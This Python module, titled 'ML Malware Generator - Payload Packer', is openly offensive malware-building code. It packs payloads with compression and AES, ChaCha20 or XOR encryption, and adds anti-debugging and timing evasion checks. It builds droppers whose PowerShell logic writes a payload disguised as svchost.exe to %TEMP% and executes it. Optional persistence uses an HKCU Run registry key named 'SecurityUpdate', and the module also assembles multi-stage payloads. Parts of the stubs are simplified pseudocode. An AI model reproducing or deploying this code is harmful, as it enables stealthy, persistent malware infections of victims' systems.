"""
ML Malware Generator - Payload Packer
Compress and encrypt payloads with anti-unpacking techniques
"""
import zlib
import lzma
import struct
from typing import Tuple, Dict, Optional
import random

from utils.crypto import get_crypto
from utils.logger import get_logger

logger = get_logger()
crypto = get_crypto()


class PayloadPacker:
    """Pack and encrypt payloads"""
    
    def __init__(self):
        self.compression_methods = ["zlib", "lzma", "custom"]
        self.encryption_methods = ["aes", "chacha20", "xor"]
    
    def pack_payload(
        self,
        payload: bytes,
        compression: str = "zlib",
        encryption: str = "aes",
        anti_unpack: bool = True,
    ) -> Tuple[bytes, Dict]:
        """
        Pack payload with compression and encryption
        
        Args:
            payload: Original payload
            compression: Compression method
            encryption: Encryption method
            anti_unpack: Add anti-unpacking techniques
        
        Returns:
            (packed_payload, metadata)
        """
        logger.info(f"Packing payload with {compression}/{encryption}")
        
        metadata = {
            "original_size": len(payload),
            "compression": compression,
            "encryption": encryption,
            "anti_unpack": anti_unpack,
        }
        
        # Compress payload
        compressed = self._compress(payload, compression)
        metadata["compressed_size"] = len(compressed)
        metadata["compression_ratio"] = len(compressed) / len(payload)
        
        # Encrypt compressed payload
        encrypted, enc_metadata = self._encrypt(compressed, encryption)
        metadata["encrypted_size"] = len(encrypted)
        metadata["encryption_metadata"] = enc_metadata
        
        # Add unpacking stub
        stub = self._generate_unpacking_stub(
            compression=compression,
            encryption=encryption,
            encrypted_size=len(encrypted),
            original_size=len(payload),
        )
        
        # Add anti-unpacking if requested
        if anti_unpack:
            stub = self._add_anti_unpacking(stub)
            metadata["anti_unpack_added"] = True
        
        # Combine stub + encrypted payload
        packed = stub + encrypted
        metadata["final_size"] = len(packed)
        
        logger.success(f"Packed payload: {len(payload)} -> {len(packed)} bytes")
        
        return packed, metadata
    
    def _compress(self, data: bytes, method: str) -> bytes:
        """Compress data"""
        if method == "zlib":
            return zlib.compress(data, level=9)
        elif method == "lzma":
            return lzma.compress(data, preset=9)
        elif method == "custom":
            return self._custom_compress(data)
        else:
            raise ValueError(f"Unknown compression method: {method}")
    
    def _custom_compress(self, data: bytes) -> bytes:
        """Custom simple compression"""
        # RLE-like compression
        compressed = bytearray()
        i = 0
        
        while i < len(data):
            count = 1
            while i + count < len(data) and data[i] == data[i + count] and count < 255:
                count += 1
            
            if count > 3:
                # Encode as: 0xFF <byte> <count>
                compressed.extend([0xFF, data[i], count])
                i += count
            else:
                # Just copy bytes
                compressed.append(data[i])
                i += 1
        
        return bytes(compressed)
    
    def _encrypt(self, data: bytes, method: str) -> Tuple[bytes, Dict]:
        """Encrypt data"""
        metadata = {"method": method}
        
        if method == "aes":
            key = crypto.generate_key(32)
            encrypted = crypto.aes_encrypt(data, key)
            metadata["key"] = key.hex()
            return encrypted, metadata
        
        elif method == "chacha20":
            key = crypto.generate_key(32)
            encrypted = crypto.chacha20_encrypt(data, key)
            metadata["key"] = key.hex()
            return encrypted, metadata
        
        elif method == "xor":
            key = crypto.generate_key(16)
            encrypted = crypto.xor_encrypt(data, key)
            metadata["key"] = key.hex()
            return encrypted, metadata
        
        else:
            raise ValueError(f"Unknown encryption method: {method}")
    
    def _generate_unpacking_stub(
        self,
        compression: str,
        encryption: str,
        encrypted_size: int,
        original_size: int,
    ) -> bytes:
        """Generate unpacking stub"""
        # Simplified stub structure
        stub = bytearray()
        
        # Magic header
        stub.extend(b'PACK')
        
        # Metadata
        stub.append(ord(compression[0]))  # Compression type
        stub.append(ord(encryption[0]))   # Encryption type
        stub.extend(struct.pack('<I', encrypted_size))
        stub.extend(struct.pack('<I', original_size))
        
        # Unpacking code (simplified representation)
        unpack_code = b"""
        # Unpacking stub
        # 1. Read encrypted payload
        # 2. Decrypt using embedded key
        # 3. Decompress
        # 4. Execute in memory
        """
        
        stub.extend(unpack_code)
        
        return bytes(stub)
    
    def _add_anti_unpacking(self, stub: bytes) -> bytes:
        """Add anti-unpacking techniques"""
        protected = bytearray()
        
        # Add debugger check
        anti_debug = b"""
        # Anti-debugging check
        if (IsDebuggerPresent()) { exit(1); }
        """
        protected.extend(anti_debug)
        
        # Add timing check
        timing_check = b"""
        # Timing check
        start = GetTickCount();
        Sleep(100);
        if (GetTickCount() - start > 200) { exit(1); }
        """
        protected.extend(timing_check)
        
        # Add checksum verification
        checksum = b"""
        # Checksum verification
        if (CalculateChecksum(stub) != EXPECTED_CHECKSUM) { exit(1); }
        """
        protected.extend(checksum)
        
        # Original stub
        protected.extend(stub)
        
        return bytes(protected)
    
    def create_dropper(
        self,
        payload: bytes,
        drop_location: str = "%TEMP%\\svchost.exe",
        persistence: bool = False,
    ) -> Tuple[bytes, Dict]:
        """
        Create dropper that extracts and executes payload
        
        Args:
            payload: Payload to drop
            drop_location: Where to drop the payload
            persistence: Add persistence mechanism
        
        Returns:
            (dropper_code, metadata)
        """
        logger.info(f"Creating dropper for {len(payload)} byte payload")
        
        metadata = {
            "payload_size": len(payload),
            "drop_location": drop_location,
            "persistence": persistence,
        }
        
        # Pack the payload
        packed, pack_metadata = self.pack_payload(payload)
        metadata["packing"] = pack_metadata
        
        # Generate dropper code
        dropper = bytearray()
        
        # Dropper header
        dropper.extend(b'DROP')
        
        # Embedded packed payload
        dropper.extend(struct.pack('<I', len(packed)))
        dropper.extend(packed)
        
        # Dropper logic (PowerShell-based)
        dropper_logic = f"""
        # Dropper logic
        $payload = [System.IO.File]::ReadAllBytes($MyInvocation.MyCommand.Path)
        $offset = 8  # Skip header
        $size = [BitConverter]::ToInt32($payload, 4)
        $packed = $payload[$offset..($offset+$size-1)]
        
        # Unpack
        $unpacked = Unpack-Payload $packed
        
        # Drop to disk
        $dropPath = "{drop_location}"
        [System.IO.File]::WriteAllBytes($dropPath, $unpacked)
        
        # Execute
        Start-Process $dropPath
        """.encode('utf-8')
        
        dropper.extend(dropper_logic)
        
        # Add persistence if requested
        if persistence:
            persistence_code = b"""
            # Add to startup
            $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            Set-ItemProperty -Path $regPath -Name "SecurityUpdate" -Value $dropPath
            """
            dropper.extend(persistence_code)
            metadata["persistence_added"] = True
        
        logger.success(f"Created dropper: {len(dropper)} bytes")
        
        return bytes(dropper), metadata
    
    def create_multi_stage_payload(
        self,
        stage1: bytes,
        stage2: bytes,
        stage3: Optional[bytes] = None,
    ) -> Tuple[bytes, Dict]:
        """
        Create multi-stage payload
        
        Args:
            stage1: Initial dropper/loader
            stage2: Second stage payload
            stage3: Optional third stage
        
        Returns:
            (multi_stage_payload, metadata)
        """
        logger.info("Creating multi-stage payload")
        
        metadata = {
            "num_stages": 3 if stage3 else 2,
            "stage1_size": len(stage1),
            "stage2_size": len(stage2),
        }
        
        # Pack stage 2
        packed_stage2, pack_meta = self.pack_payload(stage2)
        metadata["stage2_packed_size"] = len(packed_stage2)
        
        # Embed stage 2 in stage 1
        multi_stage = bytearray()
        multi_stage.extend(b'MSTG')  # Multi-stage marker
        multi_stage.extend(struct.pack('<I', len(packed_stage2)))
        multi_stage.extend(packed_stage2)
        
        if stage3:
            packed_stage3, _ = self.pack_payload(stage3)
            multi_stage.extend(struct.pack('<I', len(packed_stage3)))
            multi_stage.extend(packed_stage3)
            metadata["stage3_size"] = len(stage3)
            metadata["stage3_packed_size"] = len(packed_stage3)
        
        # Add stage 1 loader
        multi_stage.extend(stage1)
        
        metadata["total_size"] = len(multi_stage)
        
        logger.success(f"Created {metadata['num_stages']}-stage payload")
        
        return bytes(multi_stage), metadata


# Global instance
_packer = None


def get_packer() -> PayloadPacker:
    """Get global packer instance"""
    global _packer
    if _packer is None:
        _packer = PayloadPacker()
    return _packer
